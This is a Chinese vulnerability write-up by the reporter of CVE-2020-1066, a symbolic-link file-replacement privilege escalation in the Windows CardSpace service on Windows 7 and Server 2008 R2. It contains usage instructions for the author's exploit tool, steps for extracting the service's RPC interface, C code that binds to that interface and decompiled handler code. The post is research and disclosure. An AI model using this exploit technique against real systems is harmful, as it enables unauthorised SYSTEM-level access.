
### 使用说明

```
1.只适用Windows7系统直接运行,无参数,替换默认Typelib
MyComEop.exe
2.替换指定接口TypeLIb文件路径的Com组件TypeLIb,比如C:\xxx.dll
MyComEop.exe [u] [TypeLib\_Path]
3.替换指定接口IID的Com组件TypeLIb,比如 {55e3ea25-55cb-4650-8887-18e8d30bb4bc}
MyComEop.exe [u] [IID\_Interface]
4.高级模式接口IID=[IID\_Interface],接口名称=[InterfaceName],接口的TypeLib\_GUID=[TypeLib\_GUID\_Interface],接口TypeLIb文件路径=[TypeLib\_Path]
MyComEop.exe [u] [IID\_Interface] [InterfaceName] [TypeLib\_GUID\_Interface] [TypeLib\_Path] [Disable\_Redirection]
5.不替换文件,仅测试指定接口IID的Com组件TypeLIb利用,比如 {55e3ea25-55cb-4650-8887-18e8d30bb4bc}
MyComEop.exe [t] [IID\_Interface]
```

#### 运行效果

以下是笔者exp运行的效果,如图:

![查看大图](upload/attach/202006/609565\_4Q86REXXHN47T2B.gif)

#### 相关项目

<a href="elink@735K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3y4K6R3%4i4K6u0V1c8g2S2b7i4K6u0V1b7f1I4x3i4K6u0V1g2@1W2z5c8p5!0i4f1#2)9J5k6q4k6q4f1W2y4u0e0@1^5`.">CVE-2020-0787-EXP</a>

<a href="elink@928K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8W2N6A6L8X3c8G2N6%4y4Q4y4h3k6o6j5i4u0V1f1%4m8S2j5$3g2Q4y4h3k6e0k6i4u0$3K9h3y4W2">Windows CardSpace服务反编译工程</a>

<a href="elink@73aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8V1#2&6e0$3I4W2x3K6u0d9k6i4k6W2M7Y4y4W2c8h3&6Y4K9h3&6W2k6i4u0A6L8X3M7`.">我的ole32逆向工程</a>

<a href="elink@cf0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8W2c8&6M7r3g2x3K9h3u0g2L8X3#2S2M7Y4y4Z5j5h3I4W2M7R3`.`.">我的漏洞利用工具</a>

<a href="elink@5edK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5c8Y4y4&6L8h3u0G2L8r3W2U0L8r3W2F1K9#2)9J5k6s2c8W2M7%4c8A6L8X3N6Q4x3X3c8@1L8$3!0D9M7H3`.`.">符号链接工具</a>

<a href="elink@deeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3U0m8Q4x3X3b7I4x3o6j5$3i4K6u0V1c8g2S2b7">CVE-2020-1066-EXP</a>

#### 相关引用

<a href="elink@0bcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8%4u0@1j5h3I4Q4x3X3g2E0M7%4u0U0i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0V1k6%4g2A6k6r3q4F1j5$3g2Q4x3V1k6S2k6s2k6A6M7$3!0J5P5g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3U0m8Q4x3X3b7I4x3o6j5$3">CVE-2020-1066</a>

#### 参与贡献

作者来自ZheJiang Guoli Security Technology,邮箱cbwang505@hotmail.com

#### 引用

> 这个漏洞属于Windows CardSpace服务未正确处理符号链接对象导致的任意文件替换的本地权限提升漏洞

#### 申明

作者poc仅供研究目的,如果读者利用本poc从事其他行为,与本人无关

#### 目录

目录

- [引用](https://bbs.kanxue.com/#引用)
- [申明](https://bbs.kanxue.com/#申明)
- [目录](https://bbs.kanxue.com/#目录)
- [分析](https://bbs.kanxue.com/#分析)
- [漏洞影响范围](https://bbs.kanxue.com/#漏洞影响范围)
- [漏洞原理分析](https://bbs.kanxue.com/#漏洞原理分析)
- [漏洞利用分析](https://bbs.kanxue.com/#漏洞利用分析)
- [运行效果](https://bbs.kanxue.com/#运行效果)
- [相关项目](https://bbs.kanxue.com/#相关项目)
- [相关引用](https://bbs.kanxue.com/#相关引用)
- [参与贡献](https://bbs.kanxue.com/#参与贡献)

#### 分析

##### 漏洞影响范围

适用于Windows7和Windows Server 2008 R2的普通用户和开启特殊配置的IIS用户

##### 漏洞原理分析

笔者是漏洞的提交者,漏洞更新于2020年5月.漏洞来自于Windows7和Windows Server 2008 R2的Windows CardSpace服务(简称`idsvc`),该服务可由任意用户启动,本身以System权限运行,并提供公开的RPC调用,服务在由用户触发移动位于当前用户环境变量`%APPDATA%`目录下指定配置文件时未正确处理符号链接对象,导致任意文件替换的本地权限提升,这是漏洞的成因.

由于是利用基于RPC调用就需要先获取服务的接口`[MIDL](https://bbs.kanxue.com/elink@ca8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3#2A6k6r3I4Q4x3V1k6E0K9h3c8D9i4K6u0V1M7%4c8S2M7Y4c8Q4x3X3c8H3j5h3N6W2)`,这样才能编写本地代码与之交互.笔者推荐使用`[RpcView工具](https://bbs.kanxue.com/elink@c23K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9h3I4$3k6i4u0X3x3s2S2Q4x3V1k6d9M7r3y4h3K9h3g2%4)`,具体方法可以参考`[RPC漏洞挖掘系列文章](https://bbs.kanxue.com/elink@3e2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5$3y4K6b7J5y4H3`.`.)`.

先使用如下方法获取符号文件,并在工具中进行符号配置,之后就可以反编译出RPC接口IDL文件,具体方法如下

```
//先配置环境变量[_NT_SYMBOL_PATH]值如下

SRV*C:\symbols*8b3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3#2K6k6r3I4Q4x3X3g2E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5c8Y4y4&6L8h3u0G2L8s2y4Q4x3V1j5`.

//手动下载符号,symchk.exe在windbg目录下

symchk.exe "C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\infocard.exe" /v 

//在RpcView工具点击Options->Configure Symbols,输入如下内容,注意大小写

srv*C:\symbols

```

![点击看大图](https://bbs.kanxue.com/upload/attach/202006/609565_NP793AMSABWPG6V.png)

通过工具获取其中由3个重要的数据,Rpc协议的类型,协议名称和协议接口的客户端定义文件(编译IDL文件文件生成的.c文件,见左侧Decompilation文本框),这样就可以用如下方法绑定Rpc服务了

```
BOOL StartRpcService()

{

    RPC_STATUS status;

    unsigned int  cMinCalls = 1;

    RPC_BINDING_HANDLE v5;

    RPC_SECURITY_QOS SecurityQOS = {};

    RPC_WSTR StringBinding = nullptr;

    if (StartConnectingService())

    {

       //Rpc协议的类型,协议名称

        status = RpcStringBindingComposeW(nullptr, L"ncalrpc", 0, L"31336F38236F3E2C6F3F2E6F20336F20236F21326F", nullptr, &StringBinding);

        if (status){

            printf("RpcStringBindingComposeW Failed:%d\n", status);

            return(status);

        }

        status = RpcBindingFromStringBindingW(StringBinding, &hBinding);

        RpcStringFreeW(&StringBinding);

        if (status){

            printf("RpcBindingFromStringBindingW Failed:%d\n", status);

            return(status);

        }

        SecurityQOS.Version = 1;

        SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;

        SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;

        SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

        status = RpcBindingSetAuthInfoExW(hBinding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);

        if (status){

            printf("RpcBindingSetAuthInfoExW Failed:%d\n", status);

            return(status);

        }

        //绑定接口

        status = RpcEpResolveBinding(hBinding, DefaultIfName_v1_0_c_ifspec);

        if (status){

            printf("RpcEpResolveBinding Failed:%d\n", status);

            return(status);

        }

    }

    else

    {

        printf("Start Connecting Windows Cardspace Service Failed");

        return 0;

    }

    return 0;

}

```

通过反编译`idsvc`服务代码得到具体工程(见相关项目).`idsvc`服务绑定了全局RPC接口的全局处理程序`RequestFactory.ProcessNewRequest`,对于初次调用即`parentRequestHandle`为0的情况调用`CreateClientRequestInstance`类处理回调,后续操作由`CreateUIAgentRequestInstance`类处理

```
    //全局RPC接口的全局处理程序

 internal static int ProcessNewRequest(  int parentRequestHandle, IntPtr rpcHandle, IntPtr inArgs, out IntPtr outArgs)

        {

           ...

           //初次调用

                if (parentRequestHandle == 0)

                {

                    using (UIAgentMonitorHandle monitorHandle = new 

UIAgentMonitorHandle())

                    {

                        using (ClientRequest clientRequestInstance = 

RequestFactory.CreateClientRequestInstance(monitorHandle, structure.Type, 

rpcHandle, inStream, (Stream)outStream))

                        {



                            string extendedMessage;

//反射出来后执行实例的DoProcessRequest方法处理请求

                            num = clientRequestInstance.DoProcessRequest(out 

extendedMessage);

                            RpcResponse outArgs1;

                            RequestFactory.ConvertStreamToIntPtr(outStream, out 

outArgs1);

//返回结果

                            outArgs = outArgs1.Marshal();       

                        }

                   }

              }

```

`idsvc`服务会根据`RpcRequest->Type`字段种的类名反射出相应类处理回调,这里poc使用的是`"ManageRequest"`类;
